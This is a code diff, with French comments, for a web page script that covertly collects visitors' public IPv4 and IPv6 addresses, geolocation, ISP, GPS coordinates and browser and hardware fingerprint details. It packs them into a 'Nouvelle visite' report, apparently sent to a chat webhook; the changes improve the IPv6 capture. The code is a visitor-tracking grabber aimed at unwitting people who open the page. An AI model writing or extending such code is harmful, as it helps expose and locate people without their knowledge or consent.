@@ -80,34 +80,69 @@
       };
     }
 
-    // Récupération IP (IPv4 prioritaire + IPv6)
+    // Récupération IP - IPv6 prioritaire + IPv4 en secours
     async function getIPs() {
-      const urls = [
+      // Services IPv6 dédiés en premier
+      const ipv6Urls = [
+        'https://api64.ipify.org',
+        'https://ipv6.icanhazip.com',
+        'https://ifconfig.co/ip'  // souvent IPv6 si disponible
+      ];
+
+      // Services IPv4 dédiés
+      const ipv4Urls = [
         'https://ipv4.icanhazip.com',
         'https://api.ipify.org',
         'https://checkip.amazonaws.com',
-        'https://ifconfig.me/ip',
-        'https://api.myip.com',
-        'https://api64.ipify.org' // IPv6 fallback
+        'https://ifconfig.me/ip'
       ];
 
-      for (const url of urls) {
+      // On cherche d'abord IPv6
+      for (const url of ipv6Urls) {
         try {
-          const res = await fetch(url);
+          const res = await fetch(url, { cache: 'no-store' });
           if (res.ok) {
-            const text = (await res.text()).trim();
-            if (text.includes('.')) infos.ipv4 = text;
-            if (text.includes(':')) infos.ipv6 = text;
-            if (infos.ipv4) break;
+            const ip = (await res.text()).trim();
+            if (ip && ip.includes(':')) {
+              infos.ipv6 = ip;
+              break;
+            }
           }
         } catch {}
       }
 
+      // Puis IPv4 (même si IPv6 trouvée, on veut les deux)
+      for (const url of ipv4Urls) {
+        try {
+          const res = await fetch(url, { cache: 'no-store' });
+          if (res.ok) {
+            const ip = (await res.text()).trim();
+            if (ip && ip.includes('.')) {
+              infos.ipv4 = ip;
+              break;
+            }
+          }
+        } catch {}
+      }
+
+      // Fallback final avec ipapi.co (renvoie souvent IPv6 si dual-stack)
+      if (!infos.ipv4 && !infos.ipv6) {
+        try {
+          const res = await fetch('https://ipapi.co/json/');
+          const data = await res.json();
+          if (data.ip) {
+            if (data.ip.includes('.')) infos.ipv4 = data.ip;
+            else infos.ipv6 = data.ip;
+          }
+        } catch {}
+      }
+
+      // Messages par défaut si rien trouvé
       if (!infos.ipv4) infos.ipv4 = "IPv4 non détectée";
       if (!infos.ipv6) infos.ipv6 = "IPv6 non détectée";
     }
 
-    // Géoloc + ISP + ville
+    // Géoloc + ISP
     async function getGeo() {
       try {
         const res = await fetch('https://ipapi.co/json/');
@@ -158,9 +193,9 @@
           title: "Nouvelle visite",
           color: 0xff0000,
           fields: [
-            { name: "IPv4", value: infos.ipv4, inline: true },
-            { name: "IPv6", value: infos.ipv6, inline: true },
-            { name: "Ville / Région / Pays", value: `${infos.city || "?"} - ${infos.region || "?"} (${infos.country || "?"})`, inline: true },
+            { name: "IPv4 publique", value: infos.ipv4, inline: true },
+            { name: "IPv6 publique", value: infos.ipv6, inline: true },
+            { name: "Pays / Ville / Région", value: `${infos.country || "?"} - ${infos.city || "?"} (${infos.region || "?"})`, inline: true },
             { name: "GPS", value: infos.latitude ? `${infos.latitude}, ${infos.longitude}` : "refusée", inline: true },
             { name: "FAI / ISP", value: infos.isp || "?", inline: true },
             { name: "User-Agent", value: "```" + infos.userAgent.substring(0, 300) + "```", inline: false },
@@ -168,8 +203,7 @@
             { name: "Timezone", value: infos.timezone, inline: true },
             { name: "Connexion", value: infos.connection ? infos.connection.type : "?", inline: true },
             { name: "Hardware", value: `${infos.hardwareConcurrency} cœurs | ${infos.deviceMemory} Go`, inline: true },
-            { name: "Canvas", value: infos.canvas ? "présent" : "absent", inline: true },
-            { name: "WebGL", value: infos.webgl?.renderer || "?", inline: true }
+            { name: "Canvas", value: infos.canvas ? "présent" : "absent", inline: true }
           ],
           footer: { text: `ID: ${document.getElementById('txid').textContent} • ${new Date().toLocaleString('fr-FR')}` },
           timestamp: infos.timestamp
